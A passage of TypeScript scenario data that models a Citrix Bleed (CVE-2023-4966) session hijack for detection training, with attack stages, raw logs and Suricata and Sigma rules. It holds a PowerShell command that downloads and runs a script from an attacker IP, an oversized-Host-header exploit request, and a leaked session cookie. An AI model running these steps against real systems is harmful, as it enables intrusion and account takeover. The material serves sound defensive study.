        pidOrPort: 'POST /logon/LogonPoint/Authentication/GetUserName',
        privilege: 'Authenticated Domain User / Admin',
        artifacts: [
          'Same NSC_AAAC Session Used from Two Distinct Client IPs',
          'Downloads launch.ica to Connect to Internal Citrix VDI',
        ],
        description:
          'Attacker replaying the leaked 65-byte NSC_AAAC cookie to impersonate an already-authenticated user without credentials or MFA.',
      },
    },
    {
      id: 'citrix_vdi_internal',
      label: 'Internal Citrix VDI & AD Host',
      sublabel: '10.10.25.40 (VDI-CORP-14)',
      role: 'server',
      x: 78,
      y: 30,
      details: {
        osOrType: 'Windows Server 2022 Citrix Virtual Desktop Host',
        pidOrPort: 'ICA / HDX Session -> powershell.exe & AnyDesk.exe',
        privilege: 'Internal Corporate Network',
        artifacts: [
          'Adfind.exe / net.exe Active Directory Recon',
          'SharpHound / RMM Deployment (CISA AA23-325A)',
        ],
        description:
          'Internal Citrix VDI desktop launched by the attacker using the hijacked NetScaler session to pivot into Active Directory.',
      },
    },
    {
      id: 'splunk_netscaler_siem',
      label: 'Splunk Enterprise Security (STRT)',
      sublabel: 'NetScaler ns.log & Suricata WAF',
      role: 'firewall_siem',
      x: 86,
      y: 68,
      details: {
        osOrType: 'Splunk SIEM & Suricata IDS',
        pidOrPort: 'NetScaler TCP/SSLVPN Logs & Sysmon',
        privilege: 'SOC Detection Engine',
        artifacts: [
          'Alert: CVE-2023-4966 Oversized Host Header on openid-configuration',
          'Alert: Concurrent Multi-IP Usage of Single NetScaler Session',
        ],
        description:
          'Detects oversized responses from /.well-known/openid-configuration and session IP switching in NetScaler ns.log.',
      },
    },
  ],
  processTree: [
    {
      pid: 912,
      ppid: 1,
      name: 'nsppe (NetScaler Engine)',
      commandLine: '/netscaler/nsppe (Packet Processing Engine)',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'suspicious',
      activeFromStage: 1,
      apiCalls: [
        'ns_aaa_oauthrp_send_openid_config()',
        'snprintf(buf, 0x20000, ...)',
        'ns_http_send_response(buf, return_len_oob)',
      ],
    },
    {
      pid: 5310,
      ppid: 4100,
      name: 'powershell.exe (VDI Session)',
      commandLine:
        'powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://198.51.100.62/recon.ps1\')"',
      user: 'CORP\\s.miller',
      integrity: 'Medium',
      status: 'malicious',
      activeFromStage: 3,
      apiCalls: ['WinHttpOpen', 'CreateProcessW("net.exe")'],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'NETSCALER SNPRINTF OOB MEMORY LEAK (CVE-2023-4966)',
      subtitle: 'Sending 24KB Host header to /oauth/idp/.well-known/openid-configuration',
      description:
        'Because ns_aaa_oauthrp_send_openid_config() inserts the HTTP Host header into a JSON template six times using snprintf without checking if the return value exceeds the 131,072-byte buffer size, a 24,576-byte Host header causes NetScaler to transmit ~16KB of adjacent process memory in the HTTP response.',
      mitreTacticPhase: 1,
      mitreTechniqueId: 'T1190',
      mitreTechniqueName: 'Exploit Public-Facing Application',
      activeNodeIds: ['citrix_bleed_actor', 'netscaler_gateway', 'splunk_netscaler_siem'],
      compromisedNodeIds: ['netscaler_gateway'],
      keySpecs: [
        { term: 'VULNERABILITY', value: 'CVE-2023-4966 (Citrix Bleed OOB Memory Read)' },
        { term: 'TARGET URI', value: 'GET /oauth/idp/.well-known/openid-configuration' },
        { term: 'ROOT CAUSE', value: 'Unbounded snprintf return value passed to HTTP response sender' },
      ],
    },
    {
      index: 2,
      title: 'NSC_AAAC SESSION COOKIE EXTRACTION & MFA BYPASS',
      subtitle: 'Carving 65-byte hex NSC_AAAC token from leaked memory and replaying',
      description:
        'As documented in CISA AA23-325A and Mandiant reports, the leaked memory dump contains plaintext NSC_AAAC session cookies belonging to active, MFA-authenticated VPN/Citrix users. The attacker validates the stolen cookie via /logon/LogonPoint/Authentication/GetUserName and hijacks the session.',
      mitreTacticPhase: 5,
      mitreTechniqueId: 'T1539',
      mitreTechniqueName: 'Steal Web Session Cookie',
      activeNodeIds: ['citrix_bleed_actor', 'netscaler_gateway', 'nsc_aaac_session_replay', 'splunk_netscaler_siem'],
      compromisedNodeIds: ['netscaler_gateway', 'nsc_aaac_session_replay'],
      keySpecs: [
        { term: 'STOLEN COOKIE', value: 'NSC_AAAC=<65-byte hexadecimal session token>' },
        { term: 'VALIDATION URI', value: 'POST /logon/LogonPoint/Authentication/GetUserName' },
        { term: 'IMPACT', value: 'Complete MFA Bypass & Session Takeover (T1550.004)' },
      ],
    },
    {
      index: 3,
      title: 'CITRIX ICA VDI LAUNCH & INTERNAL AD RECONNAISSANCE',
      subtitle: 'Downloading launch.ica to pivot onto internal VDI workstation',
      description:
        'Using the hijacked NetScaler Gateway session, the attacker requests an ICA connection file (launch.ica), opens an interactive virtual desktop session on VDI-CORP-14 inside the corporate network, and executes PowerShell discovery and RMM tools.',
      mitreTacticPhase: 6,
      mitreTechniqueId: 'T1550.004',
      mitreTechniqueName: 'Use Alternate Authentication Material: Web Session Cookie',
      activeNodeIds: ['nsc_aaac_session_replay', 'citrix_vdi_internal', 'splunk_netscaler_siem'],
      compromisedNodeIds: ['netscaler_gateway', 'nsc_aaac_session_replay', 'citrix_vdi_internal'],
      keySpecs: [
        { term: 'PIVOT MECHANISM', value: 'Citrix StoreFront / Gateway ICA Virtual Desktop Launch' },
        { term: 'NS.LOG ANOMALY', value: 'SSLVPN TCPCONNSTAT showing 2 client IPs for 1 username/session' },
        { term: 'CISA ADVISORY', value: 'AA23-325A (Citrix Bleed Exploitation by LockBit 3.0)' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'spl-cb-1',
      no: 1,
      stageIndex: 1,
      timestamp: '15:02:11.045',
      sourceNodeId: 'citrix_bleed_actor',
      targetNodeId: 'netscaler_gateway',
      sourceLabel: '198.51.100.62',
      targetLabel: 'NetScaler :443',
      sourceType: 'IDS_ALERT',
      protocolOrEventId: 'Suricata CVE-2023-4966',
      shortAction: 'CITRIX BLEED GET',
      info: 'GET /oauth/idp/.well-known/openid-configuration with 24,576-Byte Host Header -> HTTP 200 (148,120 Bytes)',
      sizeOrCode: '148 KB Leak',
      severity: 'CRITICAL',
      mitreId: 'T1190',
      explanation:
        'A normal response from /.well-known/openid-configuration is ~1.5 KB. A response exceeding 131 KB confirms active CVE-2023-4966 memory bleed.',
      rawLog: `GET /oauth/idp/.well-known/openid-configuration HTTP/1.1
Host: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [24576 bytes]
User-Agent: curl/8.1.2

HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 148120
{"issuer": "https://AAA...", ...}\\x00\\x00\\x18\\x00NSC_AAAC=4f8a91c2e7b031948271635481920384756192038475619203847561920384756\\x00`,
      detectionRule: {
        type: 'SURICATA',
        title: 'Splunk STRT / CISA — Citrix Bleed CVE-2023-4966 Memory Leak Response',
        ruleCode: `alert http any any -> $HOME_NET any (msg:"CISA AA23-325A Citrix Bleed CVE-2023-4966 Oversized Host Header"; flow:established,to_server; http.uri; content:"/oauth/idp/.well-known/openid-configuration"; http.host; bsize:>4096; classtype:attempted-recon; sid:20234966; rev:1;)`,
        mitigation:
          'Patch Citrix NetScaler ADC/Gateway AND run "kill icaconnection -all" and "kill rdp connection -all" followed by "clear ns partition" to invalidate leaked NSC_AAAC tokens.',
      },
    },
    {
      id: 'spl-cb-2',
      no: 2,
      stageIndex: 2,
      timestamp: '15:02:19.410',
      sourceNodeId: 'nsc_aaac_session_replay',
      targetNodeId: 'netscaler_gateway',
      sourceLabel: '198.51.100.62 (Attacker)',
      targetLabel: 'NetScaler ns.log',
      sourceType: 'NETWORK',
      protocolOrEventId: 'NetScaler SSLVPN Log',
      shortAction: 'REPLAY NSC_AAAC',
      info: 'Cookie: NSC_AAAC=4f8a91c2... User=s.miller Client_ip=198.51.100.62 (Original Login IP=73.15.20.8)',
      sizeOrCode: 'IP Mismatch',
      severity: 'CRITICAL',
      mitreId: 'T1539',
      explanation:
        'NetScaler /var/log/ns.log shows an active SSLVPN session for user s.miller suddenly issuing requests from a second external IP address (198.51.100.62).',
      rawLog: `Nov 13 15:02:19 <local0.info> 172.16.8.10 11/13/2024:15:02:19 GMT ns-gw-01 0-PPE-0 : default SSLVPN TCPCONNSTAT 88120 0 : Context s.miller@73.15.20.8 - SessionId: 412 - User s.miller - Client_ip 198.51.100.62 - Nat_ip 172.16.8.11 - Dest_ip 10.10.25.40:2598`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Citrix NetScaler Session Hijack (Multiple Client IPs per SessionId)',
        ruleCode: `title: Citrix NetScaler SSLVPN Session Used From Multiple Client IPs
logsource:
  product: citrix
  service: netscaler
detection:
  selection:
    EventType: 'TCPCONNSTAT'
  condition: selection
level: critical`,
        mitigation:
          'Correlate NetScaler SessionId values in /var/log/ns.log and terminate any session where Client_ip differs from the initial authentication Context IP.',
      },
    },
    {
      id: 'spl-cb-3',
      no: 3,
      stageIndex: 3,
      timestamp: '15:04:02.915',
      sourceNodeId: 'nsc_aaac_session_replay',
      targetNodeId: 'citrix_vdi_internal',
      sourceLabel: 's.miller (Hijacked ICA)',
      targetLabel: 'VDI-CORP-14 (PID 5310)',
      sourceType: 'SYSMON',
      protocolOrEventId: 'Sysmon EID 1',
      shortAction: 'VDI POWERSHELL RECON',
      info: 'ParentImage=wfshell.exe Image=powershell.exe CommandLine="powershell -nop -w hidden IEX..."',
      sizeOrCode: 'PID 5310',
      severity: 'HIGH',
      mitreId: 'T1550.004',
      explanation:
        'Inside the Citrix VDI host, wfshell.exe (Citrix UserInit Shell) spawns hidden PowerShell to download post-exploitation reconnaissance tools.',
      rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon"/>
    <EventID>1</EventID>
    <Computer>VDI-CORP-14.corp.local</Computer>
  </System>
  <EventData>
    <Data Name="ProcessId">5310</Data>
    <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.62/recon.ps1')"</Data>
    <Data Name="ParentImage">C:\\Program Files (x86)\\Citrix\\System32\\wfshell.exe</Data>
    <Data Name="User">CORP\\s.miller</Data>
  </EventData>
</Event>`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Citrix VDI Shell (wfshell.exe) Spawning Hidden PowerShell or Recon Tools',
        ruleCode: `title: Suspicious Child Process of Citrix wfshell.exe
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith: '\\wfshell.exe'
    Image|endswith:
      - '\\powershell.exe'
      - '\\cmd.exe'
      - '\\net.exe'
      - '\\AnyDesk.exe'
  condition: selection
level: high`,
        mitigation:
          'Enforce PowerShell Constrained Language Mode and AppLocker policies on Citrix VDI images.',
      },
    },
  ],
};

export const APT_CISCO_F5_SPLUNK_SCENARIOS: AttackScenario[] = [
  TALOS_ARCANEDOOR_ASA_SCENARIO,
  TALOS_FORTINET_COATHANGER_APT_SCENARIO,
  F5_BIGIP_REQUEST_SMUGGLING_SCENARIO,
  SPLUNK_IVANTI_CONNECT_SECURE_SCENARIO,
  SPLUNK_CITRIX_BLEED_SESSION_HIJACK_SCENARIO,
];
